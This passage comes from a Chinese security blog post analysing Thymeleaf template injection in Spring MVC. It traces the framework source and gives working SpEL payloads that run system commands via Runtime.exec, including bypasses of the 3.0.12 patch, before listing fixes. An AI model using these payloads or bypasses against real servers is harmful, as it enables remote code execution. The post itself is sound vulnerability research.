src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A512.png"></p><p>正则匹配，根据该类定义的正则表达式进行匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> PREPROCESS_DELIMITER = <span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String PREPROCESS_EVAL = <span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Pattern PREPROCESS_EVAL_PATTERN = Pattern.compile(<span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A513.png"></p><p>然后是判断一下没有匹配到东西，没有匹配到<code>return checkPreprocessingMarkUnescaping(input);</code></p><p>接下来进入<code>do...while&#123;&#125;</code>循环,去判断一下预处理表达式中是否包含了另一个预处理表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">do</span> &#123;<br>    remaining = checkPreprocessingMarkUnescaping(input.substring(curr, matcher.start(<span class="hljs-number">0</span>)));<br>    String expressionText = checkPreprocessingMarkUnescaping(matcher.group(<span class="hljs-number">1</span>));<span class="hljs-comment">// 提取双下划线中间的值</span><br>    strBuilder.append(remaining);<br>    IStandardExpression expression = StandardExpressionParser.parseExpression(context, expressionText, <span class="hljs-keyword">false</span>);<span class="hljs-comment">// 又来了一遍刚才那个三目运算，猜测应该是判断是否表达式里面包含表达式</span><br>    <span class="hljs-keyword">if</span> (expression == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><span class="hljs-comment">// 执行表达式的地方</span><br>    Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);<br>    strBuilder.append(result);<br>    curr = matcher.end(<span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">while</span>(matcher.find());<br></code></pre></td></tr></table></figure><p>跟进之后，来到<code>org.thymeleaf.standard.expression.Expression</code>的第54行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// class  org.thymeleaf.standard.expression.Expression  execute()</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">execute</span><span class="hljs-params">(IExpressionContext context, StandardExpressionExecutionContext expContext)</span> </span>&#123;<br>    Validate.notNull(context, <span class="hljs-string">&quot;Context cannot be null&quot;</span>);<span class="hljs-comment">// context是否为空</span><br>    IStandardVariableExpressionEvaluator variableExpressionEvaluator = StandardExpressions.getVariableExpressionEvaluator(context.getConfiguration());<span class="hljs-comment">// 获取表达式解析引擎，此处为SpringEL</span><br>    Object result = execute(context, <span class="hljs-keyword">this</span>, variableExpressionEvaluator, expContext);<span class="hljs-comment">// 执行，继续跟进</span><br>    <span class="hljs-keyword">return</span> LiteralValue.unwrap(result);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A514.png"></p><p>来到第40行，判断表达式是否为简单的表达式【也就是Thymeleaf中常用的那几个】</p><p>跟进<code>SimpleExpression.executeSimple(context, (SimpleExpression)expression, expressionEvaluator, expContext);</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A515.png"></p><p>来到<code>org.thymeleaf.standard.expression.SimpleExpression</code>的第20行，判断传入的为何种表达式类型，然后根据传入进行选择，继续跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A516.png"></p><p>来到<code>org.thymeleaf.standard.expression.VariableExpression</code>第74行，走到79行</p><p>expressionEvaluator为获取到的表达式解析器</p><p>expression为传入的值【经过一系列处理的值】</p><p>继续跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A517.png"></p><p>来到<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>第20行，单步向下</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A518.png"></p><p>继续向下，走到第90行</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A519.png"></p><p>再往下就是SpringEL表达式的东西了，就不是我能看懂的了，所以也就不继续向下跟了，到这里基本上算是Thymeleaf的东西跟完了，执行一下</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A520.png"></p><p>简单总结一下</p><p>1.获取ViewAndModle对象</p><p>2.根据View选择最优视图解析器进行render()</p><p>3.进入Thymeleaf视图解析器之后，判断是否存在<code>::</code>，存在的话则进行表达式的处理</p><p>4.在判断是否存在<code>_</code>，存在则认为是有需要预处理的语句</p><p>5.根据传入内容，选择相应的表达式处理器</p><p>6.执行SpringEL表达式</p><h4 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这种场景下，其实现的原理基本是相同的，需要注意的是exp需要改变一下，需要在原本的exp最后加上一个.</p><p>exp：<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__.</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A522.png"></p><p>这是因为springMVC在接收到此类请求时，会对地址进行一个处理，会将最后一个点<code>.</code>之后的数据裁剪掉</p><p>还是<code>DispatcherServlet</code>中ha.handler处下断，来到第509行处，跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A523.png"></p><p>来到<code>applyDefaultViewName</code>方法，继续跟进第536行</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A524.png"></p><p>来到，此处没有进行处理，继续跟进就完了</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A525.png"></p><p>来到<code>org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</code>，继续跟进第72行</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A526.png"></p><p>来到<code>transformPath()</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A527.png"></p><p><code>stripFilenameExtension()</code>详情如下，就是将最后一个点<code>.</code>以及该点之后的内容裁剪掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">stripFilenameExtension</span><span class="hljs-params">(String path)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> extIndex = path.lastIndexOf(<span class="hljs-number">46</span>);<span class="hljs-comment">// 46对应ASCII码中的 . </span><br>    <span class="hljs-keyword">if</span> (extIndex == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> path;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">int</span> folderIndex = path.lastIndexOf(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span> folderIndex &gt; extIndex ? path : path.substring(<span class="hljs-number">0</span>, extIndex);<span class="hljs-comment">// 裁剪</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里exp需要变形的地方就通透了，一路返回到<code>DispatcherServlet</code>的509行就ok，再然后就和场景1相同了</p><h3 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h3><h4 id="1-升级新版"><a href="#1-升级新版" class="headerlink" title="1.升级新版"></a>1.升级新版</h4><p>此处复现时选用的thymeleaf版本是3.0.11，到目前为止已经有了有了3.0.15</p><h5 id="3-0-12-场景1绕过"><a href="#3-0-12-场景1绕过" class="headerlink" title="3.0.12 场景1绕过"></a>3.0.12 场景1绕过</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Thymeleaf3.0.12官方修复了该问，但仍存在绕过的可能性，故这里说一下</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A538.png"></p><p>更改下pom文件，刷新一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.12.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A537.png"></p><p>直接来到<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>的第156行</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A539.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 需要该方法返回一个false，这样就不会抛出异常</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">containsSpELInstantiationOrStatic</span><span class="hljs-params">(String expression)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> explen = expression.length();<br>    <span class="hljs-keyword">int</span> n = explen;<span class="hljs-comment">// 表达式长度</span><br>    <span class="hljs-keyword">int</span> ni = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> si = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span>(n-- != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// 从右往左遍历</span><br>        <span class="hljs-keyword">char</span> c = expression.charAt(n);<span class="hljs-comment">// 判断是否有wen，也就是new的倒叙</span><br>        <span class="hljs-keyword">if</span> (ni &gt;= NEW_LEN || c != NEW_ARRAY[ni] || ni &lt;= <span class="hljs-number">0</span> &amp;&amp; (n + <span class="hljs-number">1</span> &gt;= explen || !Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>)))) &#123;<br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                    si = n;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 判断(左边是否为T,T是否为表达式首字母</span><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span> &amp;&amp; (n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !Character.isJavaIdentifierPart(c) &amp;&amp; c != <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                        si = -<span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            ++ni;<br>            <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该段代码就是做了两个判断</p><ul><li>不能包含new</li><li><code>(</code>左边不能为T</li></ul><p>当满足这些条件时会返回<code>true</code>，导致直接抛出异常</p><p>想要绕过的话需要满足：</p><blockquote><p>1.不能有new，所以exp中不能有new</p><p>2.<code>(</code>左边的字符不能为T，所以需要在<code>(</code>左边增加一些其他字符不影响语句的字符</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 此处由于使用的是post传参，所以我能列举出来的如下</span><br><span class="hljs-comment">// 1.增加空格</span><br>__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 2.制表符</span><br>__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 3.换行符</span><br>__$&#123;T<br>(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A540.png"></p><h5 id="3-0-12-场景2绕过"><a href="#3-0-12-场景2绕过" class="headerlink" title="3.0.12 场景2绕过"></a>3.0.12 场景2绕过</h5><p>这个场景是在<a href="https://www.cnpanda.net/sec/1063.html">panda</a>这位师傅的文章上学到的，向师傅致敬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller 视图名称包含在URL的路径或参数中</span><br><span class="hljs-meta">@GetMapping(&quot;/home/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest03</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;home/&quot;</span> + path;<br>&#125;<br></code></pre></td></tr></table></figure><p>当此种场景时，上述的exp是无法实现的</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A541.png"></p><p>是因为在3.0.12新增了SpringRequestUtils.java该类，当<em>视图的名字和 path 一致</em>会经过该类的</p><p><code>checkViewNameNotInRequest()</code>方法进行检测</p><p>该方法是在<code>org.thymeleaf.spring5.view.ThymeleafView</code>第106行时进行调用</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A542.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);<br>    String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>    <span class="hljs-keyword">boolean</span> found = requestURI != <span class="hljs-keyword">null</span> &amp;&amp; requestURI.contains(vn);<br>    <span class="hljs-comment">// URI不为空时，URI中包含视图名时 found为true</span><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        Enumeration paramNames = request.getParameterNames();<br><br>        <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>            String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;<br>                String paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;<span class="hljs-comment">// 如果参数值中包含ViewName也抛出异常</span><br>                    found = <span class="hljs-keyword">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (found) &#123;<span class="hljs-comment">// 抛出异常</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此想要绕过，则需要<code>requestURI.contains(vn)</code>值为假，具体分析过程参考师傅的文章，在此就不说了，直接放上EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">home<span class="hljs-comment">//__$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br>home;/__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure><blockquote><p>exp2:</p><p>SpringBoot 有一个功能叫做矩阵变量，默认是禁用状态：</p><p>如果发现路径中存在分号，那么会调用<code>removeSemicolonContent</code>方法来移除分号</p></blockquote><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A543.png"></p><h5 id="3-0-14"><a href="#3-0-14" class="headerlink" title="3.0.14"></a>3.0.14</h5><p>这个版本的<code>checkViewNameNotInRequest()</code>有了一些改动，这个暂时还不知道该如何过去😭</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);<span class="hljs-comment">// 获取视图名</span><br>    <span class="hljs-keyword">if</span> (containsExpression(vn)) &#123;<span class="hljs-comment">// 判断视图名中是否包含thymeleaf的一些表达式</span><br>        <span class="hljs-keyword">boolean</span> found = <span class="hljs-keyword">false</span>;<br>        <span class="hljs-comment">// 获取URI</span><br>        String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>        <span class="hljs-keyword">if</span> (requestURI != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(requestURI)) &#123;<span class="hljs-comment">// URI不为空，且URI中包含表达式，直接G</span><br>            found = <span class="hljs-keyword">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            Enumeration paramNames = request.getParameterNames();<span class="hljs-comment">// 获取参数名并存入到枚举对象中</span><br><br>            <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;<span class="hljs-comment">// 存在枚举元素</span><br>                <span class="hljs-comment">// 获取所有参数值，存入String[] 中</span><br>                String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;<br>                    String paramValue = StringUtils.pack(paramValues[i]);<span class="hljs-comment">// 取出参数值</span><br>                    <span class="hljs-comment">// 参数值不为空，并且参数值中包含表达式，并且视图名称中包含该参数值，则G</span><br>                    <span class="hljs-keyword">if</span> (paramValue != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(paramValue) &amp;&amp; vn.contains(paramValue)) &#123;<br>                        found = <span class="hljs-keyword">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-ResponseBody"><a href="#2-ResponseBody" class="headerlink" title="2.@ResponseBody"></a>2.@ResponseBody</h4><p>@responseBody注解的作用是将controller的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到response对象的body区，通常用来返回JSON数据或者是XML数据。也就是说现在服务端返回的只是一段数据（数据格式需要自行指定），不再是一个渲染之后的视图了，不需要渲染，自然不会存在表达式解析等步骤，所以此时不会存在。</p><p>示例：此处将controller的返回值为String，并且有@responseBody注解，不会再进行渲染，所以只是将path进行拼接之后返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A521.png"></p><h4 id="3-redirect"><a href="#3-redirect" class="headerlink" title="3.redirect"></a>3.redirect</h4><p>重定向，直接跳转到其他页面，此时是因为springmvc不再使用Thymeleaf视图解析器，所以导致漏洞不存在了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 